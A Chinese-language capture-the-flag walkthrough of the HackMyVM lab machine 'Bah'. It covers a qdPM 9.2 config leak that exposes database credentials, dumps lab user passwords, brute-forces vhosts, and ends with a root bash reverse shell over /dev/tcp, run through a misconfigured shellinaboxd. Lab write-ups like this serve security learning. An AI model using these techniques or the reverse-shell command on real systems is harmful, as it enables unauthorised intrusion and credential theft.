# Bah

2024-11-22 https://hackmyvm.eu/machines/machine.php?vm=Bah

## IP

192.168.5.39

## Scan

```
PORT     STATE SERVICE
80/tcp   open  http
3306/tcp open  mysql
```

访问 80 web 出现的是登陆框，显示的 CMS 是 qdPM 9.2 ，先进行目录扫描看看有什么内容：

```
http://192.168.5.39/install
http://192.168.5.39/js
http://192.168.5.39/check.php
```

暂时没发现可利用的页面，通过 searchsploit 搜索，发现 9.2 存在数据库密码泄露：http://192.168.5.39/core/config/databases.yml

```
all:
  doctrine:
    class: sfDoctrineDatabase
    param:
      dsn: 'mysql:dbname=qpm;host=localhost'
      profiler: false
      username: qpmadmin
      password: "<?php echo urlencode('qpmpazzw') ; ?>"
      attributes:
        quote_identifier: true
```

尝试连接 3306：

```
mysql -h 192.168.5.39 -u qpmadmin -p
密码输入: qpmpazzw
```

进入数据库后，发现 hidden 数据库，里面有 2 个表: url 和 users

```
MariaDB [hidden]> select * from users;
+----+---------+---------------------+
| id | user    | password            |
+----+---------+---------------------+
|  1 | jwick   | Ihaveafuckingpencil |
|  2 | rocio   | Ihaveaflower        |
|  3 | luna    | Ihavealover         |
|  4 | ellie   | Ihaveapassword      |
|  5 | camila  | Ihaveacar           |
|  6 | mia     | IhaveNOTHING        |
|  7 | noa     | Ihaveflow           |
|  8 | nova    | Ihavevodka          |
|  9 | violeta | Ihaveroot           |
+----+---------+---------------------+
```

另外一个表中发现的内容：

```
MariaDB [hidden]> select * from url;
+----+-------------------------+
| id | url                     |
+----+-------------------------+
|  1 | http://portal.bah.hmv   |
|  2 | http://imagine.bah.hmv  |
|  3 | http://ssh.bah.hmv      |
|  4 | http://dev.bah.hmv      |
|  5 | http://party.bah.hmv    |
|  6 | http://ass.bah.hmv      |
|  7 | http://here.bah.hmv     |
|  8 | http://hackme.bah.hmv   |
|  9 | http://telnet.bah.hmv   |
| 10 | http://console.bah.hmv  |
| 11 | http://tmux.bah.hmv     |
| 12 | http://dark.bah.hmv     |
| 13 | http://terminal.bah.hmv |
+----+-------------------------+
```

访问 80 端口没发现什么信息，登陆窗口使用上面得到的 user 信息也不能登陆，尝试爆破以下 vhost，看看有什么：

```
gobuster vhost -u http://192.168.5.39 -w hosts -k

Found: party.bah.hmv Status: 200 [Size: 5216]
Found: console.bah.hmv Status: 200 [Size: 5659]
Found: hackme.bah.hmv Status: 200 [Size: 5657]
Found: imagine.bah.hmv Status: 200 [Size: 5659]
Found: telnet.bah.hmv Status: 200 [Size: 5657]
Found: portal.bah.hmv Status: 200 [Size: 5657]
Found: here.bah.hmv Status: 200 [Size: 5653]
Found: ssh.bah.hmv Status: 200 [Size: 5651]
Found: dev.bah.hmv Status: 200 [Size: 5651]
Found: ass.bah.hmv Status: 200 [Size: 5651]
Found: tmux.bah.hmv Status: 200 [Size: 5653]
Found: dark.bah.hmv Status: 200 [Size: 5653]
Found: terminal.bah.hmv Status: 200 [Size: 5661]
```

发现 party.bah.hmv 明显与其他不同，将起写入到 hosts 文件中，再次访问 http://party.bah.hmv/ 发现是一个 ssh 登陆页面，用上面得到的 user 信息尝试挨个登陆，发现 rocio/Ihaveaflower 能够登陆，并且得到了 user flag：

```
HdsaMoiuVdsaeqw
```

发现了一个非自带的 SGID 程序 /usr/bin/write.ul 但是是 tty 组的，没什么用，其他也没发现什么，最后用 pspy 看看后来任务有什么可利用的地方：

```
/usr/bin/shellinaboxd -q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 4200 -u shellinabox -g shellinabox --user-css Black on White:+/etc/shellinabox/options-enabled/00+Black on White.css,White On Black:-/etc/shellinabox/options-enabled/00_White On Black.css;Color Terminal:+/etc/shellinabox/options-enabled/01+Color Terminal.css,Monochrome:-/etc/shellinabox/options-enabled/01_Monochrome.css --no-beep --disable-ssl --localhost-only -s/:LOGIN -s /devel:root:root:/:/tmp/dev
```

shellinaboxd 的作用是 Starts an HTTP server that serves terminal emulators to AJAX enabled browsers. 当访问 /devel 时 会以 root 用户身份去执行/tmp/dev 中的命令，所以创建 /tmp/dev/脚本执行反弹命令：

```
/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.5.3/8888 0>&1'

curl http://party.bah.hmv/devel/
```

最终得到了反弹的 root shell，root flag 为：

```
HMVssssshell323
```
